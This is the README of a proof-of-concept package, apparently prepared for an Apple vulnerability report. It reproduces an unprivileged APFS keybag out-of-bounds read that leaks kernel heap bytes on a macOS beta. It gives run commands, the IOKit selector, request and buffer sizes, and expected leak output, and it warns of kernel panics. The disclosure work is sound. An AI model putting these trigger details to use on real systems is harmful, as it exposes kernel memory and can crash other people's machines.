# APFS keybag matching-record OOB disclosure package

This package reproduces an unprivileged APFS kernel-heap disclosure on macOS
27 beta 4 build `26A5388g`.

## Safety

Use only on a disposable test system. The malformed run can panic the kernel
when the 16 KiB keybag allocation ends at a guard boundary.

## Quick start

Run as a logged-in non-root user:

```sh
cd poc
chmod +x run_apfs_keybag_getrecord.sh apfs_get_record
./run_apfs_keybag_getrecord.sh malicious
```

The one-field in-bounds control is:

```sh
./run_apfs_keybag_getrecord.sh control
```

Neither command uses `sudo` or an entitlement-bearing helper. The supplied raw
images are already prepared.

## Expected output

Malformed:

```text
index=0 kr=0 length=0x200 reply_size=0x208
```

Bytes `0x00..0x87` are known image content. Bytes `0x88..0x1ff` are returned
from beyond the 16 KiB kernel allocation and vary between allocations.

Control:

```text
index=0 kr=0 length=0x88 reply_size=0x208
```

The control ends at `CODXBOUNDARY` and returns no post-boundary bytes.

## Layout

```text
REPORT.md                         Apple report draft
SHA256SUMS.txt                    hashes for every attachment
poc/                              final stock reproducer
evidence/                         stock outputs, repeat outputs, panics
static/                           static root-cause analysis and disassembly
analysis/                         plaintext keybag geometry and builder
```

The final trigger source is `poc/apfs_get_record.c`. It opens only the
`AppleAPFSContainer` whose registry UUID matches the supplied image and calls
selector `0x0d` with a 24-byte request and 520-byte output buffer.
